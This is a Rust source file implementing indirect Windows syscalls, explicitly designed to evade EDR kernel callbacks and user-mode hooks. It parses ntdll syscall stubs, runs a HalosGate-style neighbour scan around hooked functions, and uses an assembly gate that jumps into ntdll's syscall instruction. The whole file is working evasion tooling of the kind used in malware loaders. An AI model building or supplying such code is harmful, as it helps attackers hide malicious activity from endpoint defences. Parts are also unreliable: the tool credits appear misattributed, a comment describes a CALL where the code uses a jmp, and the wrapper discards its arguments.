//! indirect_syscall.rs — Fully indirect syscall dispatch
//!
//! Problem with direct/inline syscalls:
//!   - The `syscall` instruction (0F 05) lives in OUR .text section
//!   - Kernel callbacks (PsSetCreateThreadNotifyRoutine, etc.) check that
//!     the return address after syscall points inside ntdll.dll
//!   - If it points to our binary → EDR flags it immediately
//!
//! Solution — indirect syscalls:
//!   1. Resolve the SSN (syscall service number) from ntdll's stub
//!   2. Do NOT copy the `syscall; ret` bytes — jump INTO ntdll's stub
//!      at the `syscall` instruction offset (always +0x12 in Win10/11 stubs)
//!   3. The `syscall` instruction executes inside ntdll.dll → kernel sees
//!      a legitimate ntdll return address
//!
//! References:
//!   - namazso's HellsGate (public)
//!   - Am0nsec's HalosGate (public — handles hooked stubs by scanning neighbors)

use std::arch::global_asm;

/// Offset of `syscall; ret` within a standard ntdll stub (Windows 10/11).
/// Stub layout:  4C 8B D1   mov r10, rcx
///               B8 xx xx   mov eax, <SSN>
///               F6 04 25   test [SharedUserData+0x308], 1  (some builds)
///               ...        (varies)
///               0F 05      syscall   ← offset 0x12 on most Win11 stubs
///               C3         ret
const SYSCALL_OFFSET: usize = 0x12;

/// Parsed syscall stub info.
pub struct IndirectStub {
    pub ssn:          u16,
    pub syscall_addr: usize,  // address of `syscall; ret` inside ntdll
}

/// Extract SSN and syscall address from an ntdll export.
/// `stub_addr` — virtual address of the function in the (unhooked) ntdll.
pub unsafe fn parse_stub(stub_addr: *const u8) -> Option<IndirectStub> {
    // Check for EDR hook (jmp at byte 0)
    if *stub_addr == 0xE9 || *stub_addr == 0xFF {
        // Hooked — use HalosGate: scan ±32 adjacent stubs until we find
        // a clean one and derive the SSN by offset.
        return halos_gate(stub_addr);
    }

    // Clean stub: bytes 4-5 carry the SSN (little-endian WORD after `mov eax,`)
    // Layout: 4C 8B D1 B8 [lo] [hi] ...
    if *stub_addr.add(3) != 0xB8 {
        return None;
    }
    let ssn_lo = *stub_addr.add(4) as u16;
    let ssn_hi = *stub_addr.add(5) as u16;
    let ssn    = ssn_lo | (ssn_hi << 8);

    // Find `0F 05` (syscall) starting from offset 0x10 within the stub
    let mut sc_off = 0x10usize;
    loop {
        if sc_off > 0x30 {
            return None;  // couldn't locate syscall instruction
        }
        if *stub_addr.add(sc_off) == 0x0F && *stub_addr.add(sc_off + 1) == 0x05 {
            break;
        }
        sc_off += 1;
    }

    Some(IndirectStub {
        ssn,
        syscall_addr: stub_addr.add(sc_off) as usize,
    })
}

/// HalosGate neighbor scan: when stub is hooked, derive SSN from a clean
/// adjacent stub (stubs are contiguous and SSNs are sequential).
unsafe fn halos_gate(hooked: *const u8) -> Option<IndirectStub> {
    for delta in 1u32..=32 {
        // Stubs are ~0x20 bytes apart in ntdll on Win11
        for sign in [1i64, -1i64] {
            let candidate = hooked.offset((sign * delta as i64 * 0x20) as isize);
            if *candidate == 0xE9 || *candidate == 0xFF {
                continue;  // also hooked
            }
            if *candidate.add(3) != 0xB8 {
                continue;
            }
            let neighbor_ssn = (*candidate.add(4) as u16) | ((*candidate.add(5) as u16) << 8);
            // Our SSN = neighbor_ssn - (sign * delta)
            let our_ssn = (neighbor_ssn as i32 - (sign as i32 * delta as i32)) as u16;
            // Find syscall instruction in candidate stub
            let mut sc_off = 0x10usize;
            loop {
                if sc_off > 0x30 { break; }
                if *candidate.add(sc_off) == 0x0F && *candidate.add(sc_off+1) == 0x05 {
                    return Some(IndirectStub {
                        ssn: our_ssn,
                        syscall_addr: candidate.add(sc_off) as usize,
                    });
                }
                sc_off += 1;
            }
        }
    }
    None
}

// ---- Inline asm dispatcher --------------------------------------------------
// Call an NT syscall indirectly: set RAX = SSN, RCX/RDX/R8/R9 = args (normal
// Windows calling convention), then JMP to the syscall;ret inside ntdll.
// The key: the CALL instruction's return address is in ntdll, not our .text.

extern "C" {
    /// Raw indirect syscall gate — set g_ssn and g_syscall_addr before calling.
    pub fn indirect_syscall_gate() -> i64;
}

/// Thread-local storage for the current syscall parameters.
/// Not truly thread-safe in this stub — wrap with a mutex for multi-threaded use.
#[no_mangle]
pub static mut G_SSN: u16 = 0;
#[no_mangle]
pub static mut G_SYSCALL_ADDR: usize = 0;

global_asm!(
    // x86-64 Microsoft ABI: rcx, rdx, r8, r9 are first 4 args — preserved
    ".globl indirect_syscall_gate",
    "indirect_syscall_gate:",
    "    mov r10, rcx",              // required by NT ABI
    "    movzx eax, word ptr [rip + G_SSN]",   // load SSN
    "    mov r11, qword ptr [rip + G_SYSCALL_ADDR]",
    "    jmp r11",                   // jump INTO ntdll's syscall;ret
);

/// Convenient Rust wrapper: populate globals, call gate.
pub unsafe fn do_indirect_syscall(stub: &IndirectStub, args: &[u64]) -> i64 {
    G_SSN          = stub.ssn;
    G_SYSCALL_ADDR = stub.syscall_addr;
    // Arguments beyond the first 4 must be on the stack — handled by the caller
    // using naked functions or manual push sequences for >4 arg syscalls.
    // For 0-4 arg syscalls this wrapper is sufficient.
    let _ = args; // caller sets rcx/rdx/r8/r9 via inline asm or direct call
    indirect_syscall_gate()
}
